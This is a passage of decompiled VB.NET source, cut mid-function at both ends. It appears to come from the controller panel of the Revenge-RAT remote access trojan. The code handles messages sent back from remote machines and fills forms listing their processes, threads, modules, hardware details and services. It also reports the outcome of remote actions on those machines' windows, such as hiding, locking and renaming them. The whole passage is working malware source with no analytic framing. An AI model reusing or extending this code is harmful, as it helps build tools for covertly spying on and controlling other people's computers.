                    manager27.ToolStripStatusLabel2.Text = Conversions.ToString(Operators.ConcatenateObject("- Free Physical Memory : ", SocketServer.Decode(strArray(4))))
                Else
                    manager27.ToolStripStatusLabel4.Text = ("- " & strArray(1))
                End If
                Return
            End If
            If (str13 <> "Remove From Process List") Then
                GoTo Label_64C2
            End If
            Dim manager28 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
            Try
                enumerator13 = manager28.Processlists.Items.GetEnumerator
                Do While enumerator13.MoveNext
                    Dim item18 As ListViewItem = DirectCast(enumerator13.Current, ListViewItem)
                    If Operators.ConditionalCompareObjectEqual(item18.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                        item18.Remove()
                        GoTo Label_648B
                    End If
                Loop
            Finally
            End Try
Label_648B:
            manager28.ToolStripStatusLabel1.Text = ("Processs: ( " & Conversions.ToString(manager28.Processlists.Items.Count) & " )")
            Return
Label_64C2:
            Select Case str13
                Case "Process Threads"
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(SocketServer.Decode(strArray(2)), "Null", False))) Then
                        If Me.InvokeRequired Then
                            Dim _data14 As _data = New _data(AddressOf Me.data)
                            Me.Invoke(_data14, New Object() {sock, b})
                        Else
                            Dim properties3 As Process_Properties = DirectCast(My.Application.OpenForms.Item(("Process Properties" & strArray(1))), Process_Properties)
                            Dim strArray12 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(2))), "|", -1, CompareMethod.Binary)
                            Dim num60 As Integer = (strArray12.Length - 2)
                            Dim num14 As Integer = 0
                            Do While (num14 <= num60)
                                Dim item19 As ListViewItem = properties3.ThreadsList.Items.Add(strArray12(num14))
                                item19.SubItems.Add(strArray12((num14 + 1)))
                                item19.SubItems.Add(strArray12((num14 + 2)))
                                item19.SubItems.Add(strArray12((num14 + 3)))
                                num14 = (num14 + 3)
                                num14 += 1
                            Loop
                            properties3.ToolStripStatusLabel1.Text = "Threads Count : ( 0 )".Replace("0", Conversions.ToString(properties3.ThreadsList.Items.Count))
                            Try
                                properties3.ThreadsList.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            Catch exception56 As Exception
                                ProjectData.SetProjectError(exception56)
                                ProjectData.ClearProjectError()
                            End Try
                        End If
                    End If
                    Return
                Case "Process Modules"
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(SocketServer.Decode(strArray(2)), "Null", False))) Then
                        If Me.InvokeRequired Then
                            Dim _data15 As _data = New _data(AddressOf Me.data)
                            Me.Invoke(_data15, New Object() {sock, b})
                        Else
                            Dim properties4 As Process_Properties = DirectCast(My.Application.OpenForms.Item(("Process Properties" & strArray(1))), Process_Properties)
                            Dim strArray13 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(2))), "|", -1, CompareMethod.Binary)
                            Dim num61 As Integer = (strArray13.Length - 2)
                            Dim num15 As Integer = 0
                            Do While (num15 <= num61)
                                Dim item20 As ListViewItem = properties4.ModulesListview.Items.Add(strArray13(num15))
                                item20.SubItems.Add(strArray13((num15 + 1)))
                                item20.SubItems.Add(strArray13((num15 + 2)))
                                item20.SubItems.Add(strArray13((num15 + 3)))
                                num15 = (num15 + 3)
                                num15 += 1
                            Loop
                            properties4.ToolStripStatusLabel2.Text = "Modules Count : ( 0 )".Replace("0", Conversions.ToString(properties4.ModulesListview.Items.Count))
                            Try
                                properties4.ModulesListview.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            Catch exception57 As Exception
                            End Try
                        End If
                    End If
                    Return
                Case "Change Color"
                    Dim manager30 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(3))), System_Manager)
                    If Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(2)), "S", False) Then
                        Dim enumerator14 As IEnumerator
                        Try
                            enumerator14 = manager30.Processlists.Items.GetEnumerator
                            Do While enumerator14.MoveNext
                                Dim item21 As ListViewItem = DirectCast(enumerator14.Current, ListViewItem)
                                If Operators.ConditionalCompareObjectEqual(item21.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                                    item21.ForeColor = Color.DimGray
                                    Return
                                End If
                            Loop
                        Finally
                        End Try
                    ElseIf Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(2)), "R", False) Then
                        Dim enumerator15 As IEnumerator
                        Try
                            enumerator15 = manager30.Processlists.Items.GetEnumerator
                            Do While enumerator15.MoveNext
                                Dim item22 As ListViewItem = DirectCast(enumerator15.Current, ListViewItem)
                                If Operators.ConditionalCompareObjectEqual(item22.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                                    item22.ForeColor = Color.DarkGreen
                                    Return
                                End If
                            Loop
                        Finally
                        End Try
                    End If
                    Return
                Case "Process Properties"
                    If Me.InvokeRequired Then
                        Dim _data13 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data13, New Object() {sock, b})
                    Else
                        Dim properties2 As New Process_Properties
                        Dim manager29 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(1))), System_Manager)
                        manager29.Processlists.Enabled = True
                        manager29.ToolStripStatusLabel1.Text = "Ready to any command!"
                        properties2.Name = ("Process Properties" & strArray(1))
                        Dim strArray11 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(3))), "RENA", -1, CompareMethod.Binary)
                        properties2.PictureBox1.Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(2))))
                        If Not Directory.Exists((Interaction.Environ("Temp") & "\RevengeRATPM\")) Then
                            Directory.CreateDirectory((Interaction.Environ("Temp") & "\RevengeRATPM\"))
                        End If
                        properties2.PictureBox1.Image.Save((Interaction.Environ("Temp") & "\RevengeRATPM\" & strArray11(4) & ".ico"))
                        properties2.Icon = Icon.FromHandle(New Bitmap(properties2.PictureBox1.Image).GetHicon)
                        properties2.Sock = sock
                        If (strArray11(0).Length > 0) Then
                            properties2.Label1.Text = strArray11(0)
                        Else
                            properties2.Label1.Text = "N/A"
                        End If
                        If (strArray11(1).Length > 0) Then
                            properties2.Label3.Text = strArray11(1)
                        Else
                            properties2.Label3.Text = "N/A"
                        End If
                        properties2.Label2.Text = ("Version : " & strArray11(2))
                        properties2.IFN.Text = strArray11(3)
                        properties2.Label5.Text = ("Process Name : " & strArray11(4))
                        If (strArray11(5).Length > 0) Then
                            properties2.Label10.Text = ("Process Window Title : " & strArray11(5))
                        Else
                            properties2.Label10.Text = "Process Window Title : N/A"
                        End If
                        properties2.Label6.Text = ("Process PID : " & strArray11(6))
                        properties2.Label7.Text = ("Process Module Name : " & strArray11(7))
                        properties2.Label8.Text = ("Process Priority : " & strArray11(8))
                        properties2.Label9.Text = ("Process Responding : " & strArray11(9))
                        properties2.Label11.Text = ("Process Threads : " & strArray11(10))
                        properties2.Label12.Text = ("Process Modules : " & strArray11(11))
                        properties2.Text = (strArray11(4) & ".exe " & "(.)".Replace(".", strArray11(6)) & " Properties")
                        properties2.PID = Conversions.ToInteger(strArray11(6))
                        properties2.Show()
                    End If
                    Return
                Case Else
                    Select Case str13
                        Case "CPRES"
                            Dim manager31 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(3))), System_Manager)
                            If (strArray(1) = "D") Then
                                manager31.ToolStripStatusLabel4.Text = ("-  " & strArray(2) & " successfully started")
                            ElseIf (strArray(1) = "F") Then
                                manager31.ToolStripStatusLabel4.Text = ("-  " & strArray(2) & " unsuccessfully started")
                            End If
                            Return
                        Case "RSM"
                            Dim manager32 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(7))), System_Manager)
                            If manager32.SMB.Toggle Then
                                If Not manager32.Panel8.Enabled Then
                                    manager32.Panel8.Enabled = True
                                End If
                                If Not manager32.Label1.Enabled Then
                                    manager32.Label1.Enabled = True
                                End If
                                If Not manager32.RamGraph1.Enabled Then
                                    manager32.RamGraph1.Enabled = True
                                End If
                                manager32.Label1.Text = ("Memory : " & SocketServer.GetSize(Conversions.ToULong(strArray(1))) & " " & SocketServer.GRAMType(Conversions.ToInteger(strArray(6))))
                                manager32.RamGraph1.AddValue(Conversions.ToSingle(strArray(2)))
                                manager32.Label5.Text = SocketServer.GetSize(Conversions.ToULong(strArray(3)))
                                manager32.Label7.Text = SocketServer.GetSize(Conversions.ToULong(strArray(4)))
                                manager32.Label8.Text = (strArray(5) & " MHz")
                                manager32.Label2.Text = SocketServer.GETF(Conversions.ToInteger(strArray(8)))
                                manager32.Label11.Text = Conversions.ToString(SocketServer.Decode(strArray(9)))
                                If (manager32.Label11.Text.Length = 1) Then
                                    manager32.Label11.Text = "????"
                                End If
                                manager32.Label12.Text = Conversions.ToString(SocketServer.Decode(strArray(10)))
                                If (manager32.Label12.Text.Length = 1) Then
                                    manager32.Label12.Text = "????"
                                End If
                                manager32.Label18.Text = strArray(11)
                                manager32.Label21.Text = strArray(12)
                                manager32.Label15.Text = strArray(13)
                                manager32.Label19.Text = strArray(14)
                                manager32.Label34.Text = SocketServer.GCT(Conversions.ToInteger(strArray(15)))
                                manager32.Label37.Text = SocketServer.GCS(Conversions.ToInteger(strArray(&H10)))
                                manager32.Label31.Text = Conversions.ToString(SocketServer.Decode(strArray(&H11)))
                                manager32.Label35.Text = SocketServer.GCL(Conversions.ToInteger(strArray(&H12)))
                            End If
                            Return
                        Case "CPU"
                            Dim manager33 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
                            If manager33.GCPU.Toggle Then
                                If Not manager33.Label60.Enabled Then
                                    manager33.Label60.Enabled = True
                                End If
                                If Not manager33.Panel9.Enabled Then
                                    manager33.Panel9.Enabled = True
                                End If
                                If Not manager33.CpuGraph1.Enabled Then
                                    manager33.CpuGraph1.Enabled = True
                                End If
                                manager33.CpuGraph1.AddValue(Conversions.ToSingle(strArray(1)))
                                manager33.Label58.Text = (strArray(1) & "%")
                                manager33.Label56.Text = strArray(3)
                                manager33.Label55.Text = strArray(4)
                                manager33.Label49.Text = strArray(5)
                                manager33.Label53.Text = strArray(6)
                                manager33.Label44.Text = strArray(7)
                                manager33.Label25.Text = Conversions.ToString(SocketServer.CTMGORHR(Conversions.ToInteger(strArray(8))))
                                manager33.Label47.Text = Conversions.ToString(SocketServer.CTMGORHR(Conversions.ToInteger(strArray(9))))
                                manager33.Label41.Text = strArray(10)
                                manager33.Label45.Text = strArray(11)
                                manager33.Label52.Text = strArray(12)
                                If (manager33.TabControl1.TabPages.Item(1).Text = "CPU ( Null )") Then
                                    manager33.TabControl1.TabPages.Item(1).Text = ("CPU ( " & strArray(13) & " )")
                                    manager33.Label60.Text = ("CPU : " & strArray(13))
                                End If
                            End If
                            Return
                        Case "SDUN"
                            Dim manager34 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(1))), System_Manager)
                            If manager34.GSUS.Toggle Then
                                If Not manager34.Label79.Enabled Then
                                    manager34.Label79.Enabled = True
                                End If
                                If Not manager34.AudioGraph1.Enabled Then
                                    manager34.AudioGraph1.Enabled = True
                                End If
                                manager34.AudioGraph1.AddValue(Conversions.ToSingle(strArray(2)))
                                If (manager34.TabControl1.TabPages.Item(2).Text = "Sound Device ( Null )") Then
                                    manager34.TabControl1.TabPages.Item(2).Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("Sound Device ( ", SocketServer.Decode(strArray(3))), " )"))
                                    manager34.Label79.Text = Conversions.ToString(Operators.ConcatenateObject("Sound Device : ", SocketServer.Decode(strArray(3))))
                                End If
                            End If
                            Return
                    End Select
                    If (str13 <> "SendActivteWindows") Then
                        GoTo Label_7B98
                    End If
                    If Me.InvokeRequired Then
                        Dim _data16 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data16, New Object() {sock, b})
                        Return
                    End If
                    manager35 = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
                    strArray14 = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "*RVR*", -1, CompareMethod.Binary)
                    str7 = String.Empty
                    num16 = 0
                    Try
                        manager35.AW.Groups.Add("", "Visible ( 0 )")
                        Dim num62 As Integer = (strArray14.Length - 1)
                        Dim num18 As Integer = 0
                        Do While (num18 <= num62)
                            If Not Convert.ToBoolean(strArray14((num18 + 2))) Then
                                If (My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) Then
                                    Me.s.Send(sock, "Abort")
                                    Exit Do
                                End If
                                str7 = String.Concat(New String() {str7, strArray14(num18), "*RVR*", strArray14((num18 + 1)), "*RVR*", strArray14((num18 + 2)), "*RVR*", strArray14((num18 + 3)), "*RVR*", strArray14((num18 + 4)), "*RVR*", strArray14((num18 + 5)), "*RVR*", strArray14((num18 + 6)), "*RVR*"})
                            Else
                                Dim item23 As ListViewItem = manager35.AW.Items.Add(New ListViewItem(New String() {strArray14(num18)}, 3, manager35.AW.Groups.Item((manager35.AW.Groups.Count - 1))))
                                num16 += 1
                                item23.SubItems.Add(strArray14((num18 + 1)))
                                item23.SubItems.Add(strArray14((num18 + 2)))
                                item23.SubItems.Add(strArray14((num18 + 3)))
                                item23.SubItems.Add(strArray14((num18 + 4)))
                                item23.SubItems.Add(strArray14((num18 + 5)))
                                item23.SubItems.Add(strArray14((num18 + 6)))
                            End If
                            num18 = (num18 + 6)
                            num18 += 1
                        Loop
                    Catch exception58 As Exception
                    End Try
                    Exit Select
            End Select
            Try
                Dim enumerator16 As IEnumerator
                Try
                    enumerator16 = manager35.AW.Groups.GetEnumerator
                    Do While enumerator16.MoveNext
                        Dim group3 As ListViewGroup = DirectCast(enumerator16.Current, ListViewGroup)
                        If (group3.Header = "Visible ( 0 )") Then
                            group3.Header = "Visible ( 0 )".Replace("0", Conversions.ToString(num16))
                        End If
                    Loop
                Finally
                End Try
            Catch exception59 As Exception
            End Try
            Dim num17 As Integer = 0
            Try
                manager35.AW.Groups.Add("", "Hidden ( 0 )")
                Dim strArray15 As String() = Strings.Split(str7, "*RVR*", -1, CompareMethod.Binary)
                Dim num63 As Integer = (strArray15.Length - 2)
                Dim num19 As Integer = 0
                Do While (num19 <= num63)
                    If (My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                        GoTo Label_7A5B
                    End If
                    Dim item24 As ListViewItem = manager35.AW.Items.Add(New ListViewItem(New String() {strArray14(num19)}, 4, manager35.AW.Groups.Item((manager35.AW.Groups.Count - 1))))
                    item24.SubItems.Add(strArray15((num19 + 1)))
                    item24.SubItems.Add(strArray15((num19 + 2)))
                    item24.SubItems.Add(strArray15((num19 + 3)))
                    item24.SubItems.Add(strArray15((num19 + 4)))
                    item24.SubItems.Add(strArray15((num19 + 5)))
                    item24.SubItems.Add(strArray15((num19 + 6)))
                    num17 += 1
                    num19 = (num19 + 6)
                    num19 += 1
                Loop
            Catch exception60 As Exception
            End Try
Label_7A5B:
            Try
                Dim enumerator17 As IEnumerator
                Try
                    enumerator17 = manager35.AW.Groups.GetEnumerator
                    Do While enumerator17.MoveNext
                        Dim group4 As ListViewGroup = DirectCast(enumerator17.Current, ListViewGroup)
                        If (group4.Header = "Hidden ( 0 )") Then
                            group4.Header = "Hidden ( 0 )".Replace("0", Conversions.ToString(num17))
                        End If
                    Loop
                Finally
                End Try
            Catch exception61 As Exception
            End Try
            Try
                manager35.AW.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch exception62 As Exception
            End Try
            Dim manager36 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
            manager36.AW.Enabled = True
            manager36.ToolStripStatusLabel3.Text = ("Windows : ( " & Conversions.ToString(manager36.AW.Items.Count) & " )  - List of windows successfully created")
            Return
Label_7B98:
            If (str13 <> "Active Windows Result Options") Then
                GoTo Label_86B6
            End If
            Dim manager37 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(4))), System_Manager)
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " has been hide successfully"), False) Then
                Dim enumerator18 As IEnumerator
                Try
                    enumerator18 = manager37.AW.Items.GetEnumerator
                    Do While enumerator18.MoveNext
                        Dim item25 As ListViewItem = DirectCast(enumerator18.Current, ListViewItem)
                        If Operators.ConditionalCompareObjectEqual(item25.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                            item25.ForeColor = Color.MediumPurple
                            manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
                            GoTo Label_7CF1
                        End If
                    Loop
                Finally
                End Try
            End If
Label_7CF1:
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " has been showed successfully"), False) Then
                Dim enumerator19 As IEnumerator
                Try
                    enumerator19 = manager37.AW.Items.GetEnumerator
                    Do While enumerator19.MoveNext
                        Dim item26 As ListViewItem = DirectCast(enumerator19.Current, ListViewItem)
                        If Operators.ConditionalCompareObjectEqual(item26.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                            item26.ForeColor = Color.Brown
                            manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
                            GoTo Label_7E07
                        End If
                    Loop
                Finally
                End Try
            End If
Label_7E07:
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been maximize successfully"), False) Then
                Dim enumerator20 As IEnumerator
                Try
                    enumerator20 = manager37.AW.Items.GetEnumerator
                    Do While enumerator20.MoveNext
                        Dim item27 As ListViewItem = DirectCast(enumerator20.Current, ListViewItem)
                        If Operators.ConditionalCompareObjectEqual(item27.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                            item27.ForeColor = Color.DarkGreen
                            manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
                            GoTo Label_7F1D
                        End If
                    Loop
                Finally
                End Try
            End If
Label_7F1D:
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been minimize successfully"), False) Then
                Dim enumerator21 As IEnumerator
                Try
                    enumerator21 = manager37.AW.Items.GetEnumerator
                    Do While enumerator21.MoveNext
                        Dim item28 As ListViewItem = DirectCast(enumerator21.Current, ListViewItem)
                        If Operators.ConditionalCompareObjectEqual(item28.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                            item28.ForeColor = Color.DimGray
                            manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
                            GoTo Label_8033
                        End If
                    Loop
                Finally
                End Try
            End If
Label_8033:
            If Not Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been successfully locked"), False) Then
                GoTo Label_8143
            End If
            Try
                enumerator22 = manager37.AW.Items.GetEnumerator
                Do While enumerator22.MoveNext
                    Dim item29 As ListViewItem = DirectCast(enumerator22.Current, ListViewItem)
                    If Operators.ConditionalCompareObjectEqual(item29.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                        item29.ForeColor = Color.DarkKhaki
                        GoTo Label_810D
                    End If
                Loop
            Finally
            End Try
Label_810D:
            manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
Label_8143:
            If Not Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been successfully unlock"), False) Then
                GoTo Label_8253
            End If
            Try
                enumerator23 = manager37.AW.Items.GetEnumerator
                Do While enumerator23.MoveNext
                    Dim item30 As ListViewItem = DirectCast(enumerator23.Current, ListViewItem)
                    If Operators.ConditionalCompareObjectEqual(item30.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                        item30.ForeColor = Color.Chocolate
                        GoTo Label_821D
                    End If
                Loop
            Finally
            End Try
Label_821D:
            manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
Label_8253:
            If Not Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), SocketServer.Decode(strArray(3))), Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been successfully renamed to ===> "), SocketServer.Decode(strArray(3))), False) Then
                GoTo Label_83AA
            End If
            Try
                enumerator24 = manager37.AW.Items.GetEnumerator
                Do While enumerator24.MoveNext
                    Dim item31 As ListViewItem = DirectCast(enumerator24.Current, ListViewItem)
                    If Operators.ConditionalCompareObjectEqual(item31.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                        item31.SubItems.Item(0).Text = Conversions.ToString(SocketServer.Decode(strArray(3)))
                        item31.ForeColor = Color.DarkOrange
                        GoTo Label_8367
                    End If
                Loop
            Finally
            End Try
Label_8367:
            manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)), SocketServer.Decode(strArray(3))))
Label_83AA:
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " has been hide unsuccessfully"), False) Then
                manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
            End If
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " has been showed unsuccessfully"), False) Then
                manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
            End If
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been unsuccessfully maximize"), False) Then
                manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
            End If
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been unsuccessfully minimize"), False) Then
                manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
            End If
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), SocketServer.Decode(strArray(3))), Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been unsuccessfully renamed to ===> "), SocketServer.Decode(strArray(3))), False) Then
                manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)), SocketServer.Decode(strArray(3))))
            End If
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been unsuccessfully locked"), False) Then
                manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
            End If
            If Operators.ConditionalCompareObjectEqual(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)), Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " had been unsuccessfully unlock"), False) Then
                manager37.ToolStripStatusLabel3.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(" Handle ( ", SocketServer.Decode(strArray(1))), " )"), strArray(2)))
            End If
            Return
Label_86B6:
            If (str13 <> "GetService") Then
                GoTo Label_8D05
            End If
            If Me.InvokeRequired Then
                Dim _data17 As _data = New _data(AddressOf Me.data)
                Me.Invoke(_data17, New Object() {sock, b})
                Return
            End If
            Dim manager38 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
            If (strArray(1) = "Done") Then
                manager38.SM.Enabled = True
                manager38.ToolStripStatusLabel5.Text = ("Services : ( " & Conversions.ToString(manager38.SM.Items.Count) & " ) - List of services successfully created")
                Return
            End If
            Dim strArray16 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "ServicePlugin", -1, CompareMethod.Binary)
            manager38.SM.Groups.Add("", "Running Service ( 0 )")
            Try
                Dim num64 As Integer = (strArray16.Length - 1)
                Dim num21 As Integer = 0
                Do While (num21 <= num64)
                    If (My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                        GoTo Label_89F6
                    End If
                    If (strArray16(num21) = "Stopped") Then
                        str9 = String.Concat(New String() {str9, strArray16(num21), "|", strArray16((num21 + 1)), "|", strArray16((num21 + 2)), "|", strArray16((num21 + 3)), "|", strArray16((num21 + 4)), "|"})
                    ElseIf (strArray16(num21) = "Running") Then
                        Dim item32 As ListViewItem = manager38.SM.Items.Add(New ListViewItem(New String() {strArray16(num21)}, 0, manager38.SM.Groups.Item((manager38.SM.Groups.Count - 1))))
                        item32.SubItems.Add(strArray16((num21 + 1)))
                        item32.SubItems.Add(strArray16((num21 + 2)))
                        item32.SubItems.Add(strArray16((num21 + 3)))
                        item32.SubItems.Add(strArray16((num21 + 4)))
                    End If
                    num21 = (num21 + 4)
                    num21 += 1
                Loop
            Catch exception63 As Exception
            End Try
Label_89F6:
            Try
                enumerator25 = manager38.SM.Groups.GetEnumerator
                Do While enumerator25.MoveNext
                    Dim group5 As ListViewGroup = DirectCast(enumerator25.Current, ListViewGroup)
                    If (group5.Header = "Running Service ( 0 )") Then
                        group5.Header = "Running Service ( 0 )".Replace("0", Conversions.ToString(manager38.SM.Items.Count))
                    End If
                Loop
            Finally
            End Try
            Try
                Dim strArray17 As String() = Strings.Split(str9, "|", -1, CompareMethod.Binary)
                manager38.SM.Groups.Add("", "Stopped Service ( 0 )")
                Dim num65 As Integer = (strArray17.Length - 1)
                Dim num22 As Integer = 0
                Do While (num22 <= num65)
                    num20 += 1
                    Try
                        If (My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) Then
                            Me.s.Send(sock, "Abort")
                            GoTo Label_8C36
                        End If
                        If (strArray17(num22).Length > 3) Then
                            Dim item33 As ListViewItem = manager38.SM.Items.Add(New ListViewItem(New String() {strArray17(num22)}, 1, manager38.SM.Groups.Item((manager38.SM.Groups.Count - 1))))
                            item33.SubItems.Add(strArray17((num22 + 1)))
                            item33.SubItems.Add(strArray17((num22 + 2)))
                            item33.SubItems.Add(strArray17((num22 + 3)))
                            item33.SubItems.Add(strArray17((num22 + 4)))
                            num22 = (num22 + 4)
                        End If
                    Catch exception64 As Exception
                    End Try
                    num22 += 1
                Loop
            Catch exception65 As Exception
            End Try
Label_8C36:
            Try
                enumerator26 = manager38.SM.Groups.GetEnumerator
                Do While enumerator26.MoveNext
                    Dim group6 As ListViewGroup = DirectCast(enumerator26.Current, ListViewGroup)
                    If (group6.Header = "Stopped Service ( 0 )") Then
                        group6.Header = "Stopped Service ( 0 )".Replace("0", Conversions.ToString(CInt((num20 - 1))))
                    End If
                Loop
            Finally
            End Try
            Try
                manager38.SM.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch exception66 As Exception
            End Try
            Return
Label_8D05:
            If (str13 = "Service Status") Then
                Dim manager39 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(3))), System_Manager)
                manager39.ToolStripStatusLabel5.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(" - ", SocketServer.Decode(strArray(1))), strArray(2)))
                Return
            End If
            If (str13 = "GPI") Then
                If Me.InvokeRequired Then
